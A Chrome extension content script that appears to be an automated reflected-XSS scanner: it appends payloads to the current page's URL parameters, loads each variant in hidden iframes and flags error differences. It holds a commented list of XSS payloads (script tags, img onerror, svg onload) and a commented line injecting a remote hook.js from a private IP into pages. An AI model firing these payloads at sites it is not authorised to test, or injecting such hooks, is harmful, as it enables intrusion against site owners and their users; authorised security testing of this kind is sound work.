//(function(){
	var wlist,Tester_switch,xss_payload;
	chrome.runtime.sendMessage("switch",function(s){
		if (s == "on")	
			Tester_switch = true;
		else
			Tester_switch = false;
	});


	chrome.runtime.sendMessage("xss_payload",function(s){
		if (s)	{
			//xss_payload =  s;  
			xss_payload = eval('('+s+')').payload;
			//console.log(xss_payload);
		}             
	});
	chrome.runtime.sendMessage("wlist",function(s){
			wlist =  s; 
	});
	/*白名单不对，停止执行！*/
	window.addEventListener('error', function(e) {
		if (top == this) {
			window['vultest_frameerr'] = "";
			console.log("self_err_report:"+e.message);
			//top.err_self(e);
			window['vultest_selferr'] =  "";
			window['vultest_selferr'] = window['vultest_selferr'] + "|" +e.message;
		}
		else {
			
			//top.err_report(e,location.href);
			if (!window['vultest_frameerr'])
				window['vultest_frameerr'] = "";
			window['vultest_frameerr'] = window['vultest_frameerr']+"|"+e.message;
			console.log("frame_err_report:"+ window['vultest_frameerr']);
		}
	});
	window.addEventListener('load', function(e) {setTimeout(function(){
	if (!Tester_switch)
		return;
	if (wlist.indexOf(location.hostname+'\n')>-1)
		return;
	try{top.document} catch(e) {return;};
	if (location.pathname != top.location.pathname)
		return;
	if (top == this) {
		/*
		xss_payload = [
			"alert(location.href)\/\/",
			"\"\;alert(location.href)\;",
			"\"\)\}\;alert(location.href)\;",
			"\<script\>alert(location.href)\<\/script\>",
			"\"><img src=1 onerror=alert(location.href)>",
			"\'\><img src=1 onerror=alert(location.href)>",
			"javascript\:alert(location.href)\/\/",
			"888\" onerror=alert(location.href) a\=\"",
			"<svg onload=alert(location.href)>"
			];*/
		function xss_testfrm(s){
			try {
			var xss_frm = document.createElement("iframe");
			document.body.appendChild(xss_frm);
			xss_frm.style.display="none";
			xss_frm.id = unescape(s);
			xss_frm.src = s;
			}catch(e) {
				console.log(e);
			}
		}

		function xss_r(s) {
			console.warn("XSS WAINNING:"+s);
			alert("XSS WAINNING:"+s);
		}

		function err_self(msg) {
			console.log("err_self:"+msg);
			window['vultest_selferr'] = window['vultest_selferr'] + "|" +msg;
		}
		function err_report(msg,uri) {
			console.log("err_rpt:"+msg);
			top.window['vultest_frameerr'][uri] = top.window['vultest_frameerr'][uri]+ "|" +msg;
		}
		function analyze() {

		}
		var tagBall="init";
		if (location.href.indexOf(["#?"]) > 0)
			tagBall = "#?";
		else if (location.href.indexOf(["?#"]) > 0)	
			tagBall = "?#";
		else if (location.href.indexOf(["#"]) > 0)
			tagBall = "#";
		else if (location.href.indexOf(["?"]) > 0)
			tagBall = "?";
		else
			tagBall = "#";
		var vars = location.href.split(tagBall)[1];


		if (location.href.indexOf(tagBall) > 0) {
			/*存在多个参数的情况*/
			if (vars.indexOf("&") > 0) {
			var kv = vars.split("&");
			for (var n=0;n < kv.length;n++) {
				for (var i=0;i < xss_payload.length;i++) {
					//if (kv[n].match(/^(http|https)/i))
					kv[n]=kv[n] + xss_payload[i];
					var xss_testurl = location.href.split(tagBall)[0] +tagBall + kv.join("&");
					console.log("url2:"+xss_testurl);
					xss_testfrm(xss_testurl);
					kv = vars.split("&");
				}
			}
		} else { /*只存在一个参数的情况*/
			for (var i=0;i < xss_payload.length;i++) {
				var xss_testurl = location.href + xss_payload[i];
				console.log("url3:"+xss_testurl);
				xss_testfrm(xss_testurl);
			}
		}
		if (tagBall == "?") {
			for(var i=0;i < xss_payload.length;i++) {
				var xss_testurl = location.href + "#" + xss_payload[i];
				console.log("url5:"+xss_testurl); 
				xss_testfrm(xss_testurl);		
			}
		}
		} else /*不存在参数的情况*/
			for(var i=0;i < xss_payload.length;i++) {
					var xss_testurl = location.href + tagBall + xss_payload[i];
					console.log("url4:"+xss_testurl); 
					xss_testfrm(xss_testurl);		
			}
	} else {
			if (top.window['vultest_selferr'] != window['vultest_frameerr']) {
				top.document.body.style.border = '14px solid #A500CC';
				console.warn("Catch Diff Error:\n"+location.href);
			}
			top.setTimeout(function(){
				try {top.document.body.removeChild(top.document.getElementById(unescape(location.href)));}
				catch (e) {};
					
			},4000);
			
	}
	},1000)});
	// document.documentElement.innerHTML = document.documentElement.innerHTML + "<script src=\"http://192.168.152.131/hook.js\"></script>";
//})();
